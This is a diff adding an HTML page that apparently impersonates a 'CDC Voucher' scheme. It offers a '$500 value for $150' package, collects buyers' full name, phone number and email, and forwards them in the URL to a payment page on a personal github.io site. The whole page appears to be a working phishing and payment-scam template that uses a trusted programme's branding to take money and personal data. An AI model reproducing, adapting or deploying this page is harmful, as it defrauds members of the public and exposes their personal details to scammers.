@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Buy CDC Vouchers - Buyer Details</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Enter your details to buy CDC Vouchers securely online.">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f9f9;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #007e8c;
+      padding: 0;
+      text-align: center;
+    }
+
+    header img {
+      width: 100%;
+      max-width: 768px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .container {
+      max-width: 500px;
+      background: #fff;
+      margin: 30px auto;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+    }
+
+    h1 {
+      font-size: 24px;
+      text-align: center;
+      color: #007e8c;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .qty-controls {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 15px;
+      gap: 15px;
+    }
+
+    .qty-controls button {
+      width: 36px;
+      height: 36px;
+      font-size: 20px;
+      border: none;
+      background-color: #007e8c;
+      color: white;
+      cursor: pointer;
+      border-radius: 6px;
+    }
+
+    .qty-controls span {
+      font-size: 18px;
+      min-width: 30px;
+      text-align: center;
+    }
+
+    .total {
+      margin-top: 20px;
+      font-size: 18px;
+      text-align: right;
+      color: #333;
+      font-weight: bold;
+    }
+
+    .submit-btn {
+      background-color: #007e8c;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      margin-top: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 6px;
+    }
+
+    .submit-btn:hover {
+      background-color: #005e6a;
+    }
+
+    @media screen and (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://singxsavor.github.io/cdcvoucher/cdc-logo.png" alt="CDC Voucher Banner">
+</header>
+
+<div class="container">
+  <h1>Buy CDC Vouchers</h1>
+  <form id="voucherForm">
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" name="fullName" required>
+
+    <label for="contactNumber">Contact Number</label>
+    <input type="tel" id="contactNumber" name="contactNumber" required>
+
+    <label for="email">Email Address</label>
+    <input type="email" id="email" name="email" required>
+
+    <label>Product</label>
+    <p>CDC Voucher Package — $500 value for $150</p>
+
+    <div class="qty-controls">
+      <button type="button" onclick="updateQty(-1)">−</button>
+      <span id="quantity">1</span>
+      <button type="button" onclick="updateQty(1)">+</button>
+    </div>
+
+    <div class="total">
+      Total: $<span id="totalAmount">150</span>
+    </div>
+
+    <button type="submit" class="submit-btn">Make Payment</button>
+  </form>
+</div>
+
+<script>
+  let qty = 1;
+  const pricePerSet = 150;
+
+  function updateQty(change) {
+    qty = Math.max(1, qty + change);
+    document.getElementById('quantity').innerText = qty;
+    document.getElementById('totalAmount').innerText = qty * pricePerSet;
+  }
+
+  document.getElementById('voucherForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const total = qty * pricePerSet;
+    const name = encodeURIComponent(document.getElementById('fullName').value);
+    const contact = encodeURIComponent(document.getElementById('contactNumber').value);
+    const email = encodeURIComponent(document.getElementById('email').value);
+
+    window.location.href = `https://singxsavor.github.io/cdcvoucher/payment-page.html?name=${name}&contact=${contact}&email=${email}&F12_Amount=${total}`;
+  });
+</script>
+
+</body>
+</html>
